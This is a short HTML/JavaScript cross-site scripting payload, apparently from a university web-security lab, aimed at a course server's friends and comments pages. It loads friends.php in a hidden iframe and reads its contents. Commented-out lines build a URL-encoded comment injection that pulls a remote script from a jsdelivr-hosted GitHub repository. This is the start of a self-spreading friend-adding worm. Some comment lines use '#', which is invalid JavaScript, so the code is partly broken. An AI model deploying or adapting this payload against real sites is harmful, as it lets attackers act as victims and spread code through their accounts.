<iframe id="hid" src="http://csec380-core.csec.rit.edu:86/friends.php"></iframe>
<script>
    var e = document.getElementById("hid");
    e.addEventListener("load",function(){
       var cont= e.contentWindow.document.body.innerHTML.match('^[^<br]*');
       alert(cont);
       #var numbers = e.matchAll('[^,]*');    # [22,4,5,2,1]
       #for( var num in numbers ){
       #    var string1 = "https://csec380-core.csec.rit.edu:86/add_friend.php?id=101";
       #    var string = "%3Ciframe%20style%3D%22display%3A%20none%22%20src%3D%22http%3A%2F%2Fcsec380-core.csec.rit.edu%3A86%2Fadd_comment.php%3Fid%3D"+num+"%26comment%3D%3Cscript%20src%3D%27https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FDarkLemon27%2FWebApp%40latest%2Ffriend.js%27%3E%3C%2Fscript%3E%3E%3C%2Fiframe%3EHello%20Young%27nsgss";
       #}
   });
</script>
